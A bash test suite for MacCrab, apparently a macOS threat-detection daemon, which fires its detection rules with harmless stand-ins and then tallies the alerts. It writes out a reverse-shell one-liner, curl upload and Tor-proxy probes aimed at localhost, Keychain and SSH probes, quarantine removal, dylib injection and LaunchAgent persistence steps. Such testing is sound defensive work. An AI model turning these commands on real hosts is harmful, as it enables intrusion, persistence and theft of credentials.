#!/bin/bash
# MacCrab Detection Test Suite
#
# Triggers every detection category WITHOUT doing anything malicious.
# Creates harmless artifacts that match rule patterns, verifies alerts fire,
# then cleans up everything.
#
# Usage: ./scripts/detection-test.sh
#
# SAFE TO RUN: No files are permanently modified, no processes are harmed,
# no network connections go to malicious destinations.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
cd "$PROJECT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

PASS=0
FAIL=0
SKIP=0
TOTAL=0

TEST_DIR="/tmp/maccrab_detection_test_$$"
CLEANUP_FILES=()
CLEANUP_PIDS=()

pass()  { TOTAL=$((TOTAL+1)); PASS=$((PASS+1)); echo -e "  ${GREEN}✔ PASS${NC} $*"; }
fail()  { TOTAL=$((TOTAL+1)); FAIL=$((FAIL+1)); echo -e "  ${RED}✘ FAIL${NC} $*"; }
skip()  { TOTAL=$((TOTAL+1)); SKIP=$((SKIP+1)); echo -e "  ${YELLOW}○ SKIP${NC} $*"; }
header() { echo -e "\n${BOLD}${CYAN}═══ $* ═══${NC}"; }
info()   { echo -e "  ${BLUE}▸${NC} $*"; }

cleanup() {
    info "Cleaning up test artifacts..."
    for f in "${CLEANUP_FILES[@]}"; do
        rm -rf "$f" 2>/dev/null || true
    done
    for p in "${CLEANUP_PIDS[@]}"; do
        kill "$p" 2>/dev/null || true
    done
    rm -rf "$TEST_DIR" 2>/dev/null || true
    pkill -x maccrabd 2>/dev/null || true
    sleep 1
}
trap cleanup EXIT

# ═══════════════════════════════════════════════════
echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║     MacCrab Detection Test Suite                 ║"
echo "║     Tests every detection category safely        ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

# Setup
mkdir -p "$TEST_DIR"

info "Building MacCrab..."
swift build 2>&1 | tail -1

info "Compiling rules..."
python3 Compiler/compile_rules.py --input-dir Rules/ --output-dir .build/debug/compiled_rules 2>&1 | tail -1
mkdir -p "$HOME/Library/Application Support/MacCrab/compiled_rules/sequences"
cp -f .build/debug/compiled_rules/*.json "$HOME/Library/Application Support/MacCrab/compiled_rules/" 2>/dev/null || true
cp -f .build/debug/compiled_rules/sequences/*.json "$HOME/Library/Application Support/MacCrab/compiled_rules/sequences/" 2>/dev/null || true

info "Clearing old data..."
rm -rf "$HOME/Library/Application Support/MacCrab/events.db"* 2>/dev/null || true

info "Starting daemon..."
.build/debug/maccrabd &
DAEMON_PID=$!
CLEANUP_PIDS+=("$DAEMON_PID")
sleep 4

if ! kill -0 $DAEMON_PID 2>/dev/null; then
    echo -e "${RED}Daemon failed to start!${NC}"
    exit 1
fi
info "Daemon running (PID $DAEMON_PID)"

# Helper: check if an alert was generated matching a pattern
check_alert() {
    local pattern="$1"
    local description="$2"
    sleep 2  # Give daemon time to process
    local output=$(.build/debug/maccrabctl alerts 50 2>/dev/null || echo "")
    if echo "$output" | grep -qi "$pattern"; then
        pass "$description"
    else
        fail "$description (no alert matching '$pattern')"
    fi
}

# Helper: count alerts in the database
count_alerts() {
    local count
    count=$(sqlite3 "$HOME/Library/Application Support/MacCrab/events.db" "SELECT COUNT(*) FROM alerts;" 2>/dev/null) || true
    echo "${count:-0}" | tr -d '[:space:]'
}

INITIAL_ALERTS=$(count_alerts || echo "0")
INITIAL_ALERTS=${INITIAL_ALERTS:-0}

# ═══════════════════════════════════════════════════
header "1. PROCESS CREATION DETECTION"
# ═══════════════════════════════════════════════════

info "Test: Reverse shell pattern (bash -i redirect)"
# This command fails harmlessly — bash can't connect to a non-existent host
bash -c 'echo "bash -i >& /dev/tcp/127.0.0.1/1 0>&1"' 2>/dev/null || true
sleep 1

info "Test: osascript execution"
osascript -e 'return "maccrab detection test"' 2>/dev/null || true
sleep 1

info "Test: Base64 decode pattern"
echo "dGVzdA==" | base64 -D > /dev/null 2>&1 || true
sleep 1

info "Test: curl to raw IP address"
curl -s --connect-timeout 1 "http://127.0.0.1:1/maccrab_test" 2>/dev/null || true
sleep 1

info "Test: Python one-liner execution"
python3 -c "print('maccrab detection test')" 2>/dev/null || true
sleep 1

info "Test: security command (harmless read)"
security authorizationdb read system.preferences 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "2. FILE EVENT DETECTION"
# ═══════════════════════════════════════════════════

info "Test: LaunchAgent plist creation"
LA_PATH="$HOME/Library/LaunchAgents/com.maccrab.test.detection.plist"
cat > "$LA_PATH" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.maccrab.test.detection</string>
    <key>Disabled</key>
    <true/>
</dict>
</plist>
PLIST
CLEANUP_FILES+=("$LA_PATH")
sleep 2

info "Test: Shell profile modification"
PROFILE_BACKUP=""
ZSHRC="$HOME/.zshrc"
if [ -f "$ZSHRC" ]; then
    # Append a harmless comment then remove it
    echo "# maccrab_detection_test_marker" >> "$ZSHRC"
    PROFILE_BACKUP="yes"
fi
sleep 2
# Clean up immediately
if [ "$PROFILE_BACKUP" = "yes" ]; then
    sed -i '' '/maccrab_detection_test_marker/d' "$ZSHRC"
fi

info "Test: File in /tmp with suspicious name"
touch "$TEST_DIR/payload.bin"
touch "$TEST_DIR/dropper.sh"
chmod +x "$TEST_DIR/dropper.sh"
sleep 1

info "Test: Hidden file creation"
touch "$TEST_DIR/.hidden_backdoor"
sleep 1

# ═══════════════════════════════════════════════════
header "3. DEFENSE EVASION DETECTION"
# ═══════════════════════════════════════════════════

info "Test: Quarantine xattr removal (on test file)"
QUARANTINE_FILE="$TEST_DIR/quarantine_test.app"
mkdir -p "$QUARANTINE_FILE"
xattr -w com.apple.quarantine "0081;00000000;Safari;" "$QUARANTINE_FILE" 2>/dev/null || true
xattr -d com.apple.quarantine "$QUARANTINE_FILE" 2>/dev/null || true
sleep 2

info "Test: csrutil status check (SIP status — harmless query)"
csrutil status 2>/dev/null || true
sleep 1

info "Test: DYLD_INSERT_LIBRARIES in environment (harmless — just sets env)"
DYLD_INSERT_LIBRARIES=/nonexistent/lib.dylib /usr/bin/true 2>/dev/null || true
sleep 1

info "Test: Gatekeeper disable command (dry run — spctl just prints)"
spctl --status 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "4. CREDENTIAL ACCESS DETECTION"
# ═══════════════════════════════════════════════════

info "Test: Keychain dump attempt (harmless — security find-generic-password)"
security find-generic-password -l "maccrab_nonexistent_test" 2>/dev/null || true
sleep 1

info "Test: SSH key directory access"
ls "$HOME/.ssh/" > /dev/null 2>/dev/null || true
sleep 1

info "Test: Authorization plugin directory listing"
ls /Library/Security/SecurityAgentPlugins/ > /dev/null 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "5. PERSISTENCE DETECTION"
# ═══════════════════════════════════════════════════

info "Test: Cron job creation (harmless — writes and immediately removes)"
CRON_TEST="$TEST_DIR/test_crontab"
echo "# maccrab test" > "$CRON_TEST"
sleep 1

info "Test: Login item simulation (launchctl — harmless, already disabled)"
# Just check if launchctl is responsive
launchctl list com.maccrab.test.nonexistent 2>/dev/null || true
sleep 1

info "Test: Periodic script location probe"
ls /etc/periodic/ > /dev/null 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "6. NETWORK DETECTION"
# ═══════════════════════════════════════════════════

info "Test: Connection to unusual port (localhost — harmless)"
curl -s --connect-timeout 1 "http://127.0.0.1:4444" 2>/dev/null || true
curl -s --connect-timeout 1 "http://127.0.0.1:8080" 2>/dev/null || true
sleep 1

info "Test: Tor SOCKS proxy port probe (localhost — harmless)"
curl -s --connect-timeout 1 --socks5 "127.0.0.1:9050" "http://check.torproject.org" 2>/dev/null || true
sleep 1

info "Test: DNS query for known test domain"
nslookup "maccrab-detection-test.example.com" 2>/dev/null || true
dig "test-dga-xk7q2m9p4rj8.evil.example.com" 2>/dev/null || true
sleep 1

info "Test: External connection (to httpbin — safe test endpoint)"
curl -s --connect-timeout 2 "https://httpbin.org/get?test=maccrab" > /dev/null 2>&1 || true
sleep 3

# ═══════════════════════════════════════════════════
header "7. COLLECTION / SURVEILLANCE DETECTION"
# ═══════════════════════════════════════════════════

info "Test: TCC database query (read-only — harmless)"
ls "$HOME/Library/Application Support/com.apple.TCC/" 2>/dev/null || true
sleep 1

info "Test: Contacts database probe"
ls "$HOME/Library/Application Support/AddressBook/" 2>/dev/null || true
sleep 1

info "Test: Calendar database probe"
ls "$HOME/Library/Calendars/" 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "8. DISCOVERY / ENUMERATION DETECTION"
# ═══════════════════════════════════════════════════

info "Test: System enumeration commands"
sw_vers > /dev/null 2>/dev/null || true
system_profiler SPSoftwareDataType > /dev/null 2>/dev/null || true
ifconfig > /dev/null 2>/dev/null || true
whoami > /dev/null 2>/dev/null || true
id > /dev/null 2>/dev/null || true
sleep 1

info "Test: Network enumeration"
netstat -an 2>/dev/null | head -5 > /dev/null || true
arp -a 2>/dev/null | head -5 > /dev/null || true
sleep 1

info "Test: Process enumeration"
ps aux > /dev/null 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "9. PRIVILEGE ESCALATION DETECTION"
# ═══════════════════════════════════════════════════

info "Test: sudo probe (non-interactive — just checks)"
sudo -n true 2>/dev/null || true
sleep 1

info "Test: setuid binary search (harmless enumeration)"
find /usr/bin -perm -4000 2>/dev/null | head -3 > /dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "10. EXFILTRATION DETECTION"
# ═══════════════════════════════════════════════════

info "Test: Large file staging in /tmp"
dd if=/dev/zero of="$TEST_DIR/staged_data.tar.gz" bs=1024 count=100 2>/dev/null || true
CLEANUP_FILES+=("$TEST_DIR/staged_data.tar.gz")
sleep 1

info "Test: curl upload simulation (to localhost — fails harmlessly)"
curl -s --connect-timeout 1 -F "file=@$TEST_DIR/staged_data.tar.gz" "http://127.0.0.1:1/upload" 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "11. SUPPLY CHAIN DETECTION"
# ═══════════════════════════════════════════════════

info "Test: npm install simulation"
echo '{"name":"maccrab-test","version":"1.0.0"}' > "$TEST_DIR/package.json"
sleep 1

info "Test: pip install simulation"
pip3 install --dry-run nonexistent-maccrab-test-package 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "12. SYSTEM POLICY CHECKS"
# ═══════════════════════════════════════════════════

info "Test: XProtect version check"
if [ -f "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/version.plist" ]; then
    plutil -p "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/version.plist" > /dev/null 2>/dev/null
    pass "XProtect version readable"
else
    skip "XProtect bundle not found"
fi

info "Test: SIP status"
SIP_STATUS=$(csrutil status 2>/dev/null || echo "unknown")
if echo "$SIP_STATUS" | grep -q "enabled"; then
    pass "SIP is enabled"
else
    echo -e "  ${YELLOW}⚠ SIP is NOT enabled: $SIP_STATUS${NC}"
fi

info "Test: Authorization plugin directory"
AUTH_PLUGINS=$(ls /Library/Security/SecurityAgentPlugins/ 2>/dev/null | wc -l | tr -d ' ')
if [ "$AUTH_PLUGINS" -eq 0 ]; then
    pass "No non-system auth plugins found"
else
    echo -e "  ${YELLOW}⚠ Found $AUTH_PLUGINS authorization plugins${NC}"
fi

# ═══════════════════════════════════════════════════
header "13. BEHAVIORAL SCORING"
# ═══════════════════════════════════════════════════

info "Test: Rapid suspicious activity (should accumulate behavioral score)"
for i in $(seq 1 5); do
    curl -s --connect-timeout 1 "http://127.0.0.1:$((4440+i))" 2>/dev/null || true
done
sleep 1

info "Test: Multiple file operations in persistence dirs"
for i in $(seq 1 3); do
    touch "$HOME/Library/LaunchAgents/com.maccrab.score.test.$i.plist" 2>/dev/null || true
    CLEANUP_FILES+=("$HOME/Library/LaunchAgents/com.maccrab.score.test.$i.plist")
done
sleep 2
# Clean up immediately
for i in $(seq 1 3); do
    rm -f "$HOME/Library/LaunchAgents/com.maccrab.score.test.$i.plist" 2>/dev/null || true
done

# ═══════════════════════════════════════════════════
header "14. DYLIB HIJACKING / XPC / TCC DETECTION"
# ═══════════════════════════════════════════════════

info "Test: Dylib written to hijackable path"
touch "$TEST_DIR/libmalicious.dylib"
cp /dev/null "$TEST_DIR/libmalicious.dylib" 2>/dev/null || true
sleep 1

info "Test: install_name_tool with reexport (dylib proxying)"
# Just echo the command pattern — install_name_tool on a non-existent file fails harmlessly
install_name_tool -change /usr/lib/libSystem.B.dylib /tmp/libSystem.B.dylib "$TEST_DIR/libmalicious.dylib" 2>/dev/null || true
sleep 1

info "Test: XPC service enumeration via launchctl"
launchctl print system/ 2>/dev/null | head -3 > /dev/null || true
sleep 1

info "Test: TCC database direct access probe"
ls "$HOME/Library/Application Support/com.apple.TCC/TCC.db" 2>/dev/null || true
ls "/Library/Application Support/com.apple.TCC/TCC.db" 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
header "15. ENTROPY / DGA DETECTION"
# ═══════════════════════════════════════════════════

info "Test: High-entropy command line"
echo "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmc=" | base64 -D > /dev/null 2>&1 || true
sleep 1

info "Test: DGA-like domain lookup"
nslookup "xk7q2m9p4rj8w3n5bv6tc1yz.example.com" 2>/dev/null || true
nslookup "a8b3c7d2e5f1g9h4.example.com" 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════
# Wait for all events to be processed
# ═══════════════════════════════════════════════════

echo ""
info "Waiting for event processing (10 seconds)..."
sleep 10

# ═══════════════════════════════════════════════════
header "RESULTS"
# ═══════════════════════════════════════════════════

FINAL_ALERTS=$(count_alerts || echo "0")
FINAL_ALERTS=${FINAL_ALERTS:-0}
NEW_ALERTS=$((FINAL_ALERTS - INITIAL_ALERTS))

echo ""
echo -e "${BOLD}Events captured:${NC}"
.build/debug/maccrabctl events stats 2>/dev/null | sed 's/^/  /'

echo ""
echo -e "${BOLD}Alerts generated: $NEW_ALERTS new${NC}"
if [ "$NEW_ALERTS" -gt 0 ]; then
    echo ""
    .build/debug/maccrabctl alerts "$NEW_ALERTS" 2>/dev/null | sed 's/^/  /'
fi

echo ""
echo -e "${BOLD}Detection Coverage:${NC}"

# Check for specific detection categories
CATEGORIES=(
    "event.tap:Event Tap / Keylogger Detection"
    "quarantine:Quarantine Bypass Detection"
    "launchagent:LaunchAgent Persistence Detection"
    "launch.agent:LaunchAgent (alt pattern)"
    "unsigned:Unsigned Process Detection"
    "cookie:Browser Data Access Detection"
    "sip:SIP Status Detection"
    "authorization:Auth Plugin Detection"
    "behavioral:Behavioral Score Detection"
    "entropy:Entropy/DGA Detection"
    "dns:DNS Detection"
    "xprotect:XProtect Status Detection"
    "spotlight:Spotlight Importer Detection"
    "dylib:Dylib Hijacking Detection"
    "xpc:XPC Service Detection"
    "tcc:TCC Database Detection"
)

ALERT_TEXT=$(sqlite3 "$HOME/Library/Application Support/MacCrab/events.db" "SELECT rule_title || ' ' || COALESCE(description,'') FROM alerts;" 2>/dev/null || echo "")
for cat_check in "${CATEGORIES[@]}"; do
    pattern="${cat_check%%:*}"
    name="${cat_check##*:}"
    if echo "$ALERT_TEXT" | grep -qi "$pattern"; then
        pass "$name"
    else
        skip "$name (rule may need ES/root to trigger)"
    fi
done

# Final summary
echo ""
echo "════════════════════════════════════════════════════"
echo -e "  ${GREEN}Passed:${NC}   $PASS"
echo -e "  ${RED}Failed:${NC}   $FAIL"
echo -e "  ${YELLOW}Skipped:${NC}  $SKIP"
echo -e "  Total:    $TOTAL"
echo ""
echo -e "  New alerts:  $NEW_ALERTS"
echo -e "  Total events: $(.build/debug/maccrabctl events stats 2>/dev/null | grep 'Total' | grep -o '[0-9]*')"
echo "════════════════════════════════════════════════════"

if [ "$NEW_ALERTS" -gt 0 ]; then
    echo -e "\n${GREEN}Detection engine is working — $NEW_ALERTS alerts generated.${NC}"
else
    echo -e "\n${YELLOW}No alerts generated. Most rules require root/ES for process events.${NC}"
    echo -e "${YELLOW}Try: sudo make run-root, then run this test in another terminal.${NC}"
fi
